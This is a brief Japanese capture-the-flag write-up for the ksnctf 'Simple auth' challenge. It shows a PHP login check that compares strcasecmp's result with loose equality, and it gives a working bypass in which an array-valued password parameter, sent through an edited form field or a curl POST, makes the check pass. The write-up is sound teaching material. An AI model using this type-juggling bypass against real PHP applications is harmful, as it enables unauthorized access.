# Ksnctf 32 Simple auth

<https://ksnctf.sweetduet.info/problem/32>

<http://ctfq.sweetduet.info:10080/~q32/auth.php>

```php
<?php
$password = 'FLAG_????????????????';
if (isset($_POST['password']))
    if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
?>
```

## 問題

<https://secure.php.net/manual/ja/function.isset.php>

<https://secure.php.net/manual/ja/function.strcasecmp.php>

isset で password 変数が値を持つかチェックし，strcasecmp で文字列比較

== となっているので strcasecmp に配列変数を渡すと，NULL が返り値となり、true つまり 0 を返す

## 解法

chrome で

```html
<input type="password" name="password[]" />
```

に書き換えて適当な文字を post すると

```
Congratulations! The flag is FLAG_XXXXXXXXXXXXXXXX
```

curl で post する方法もある

```bash
curl -X POST -F ' password[]="" ' http://ctfq.sweetduet.info:10080/~q32/auth.php
```

flag get
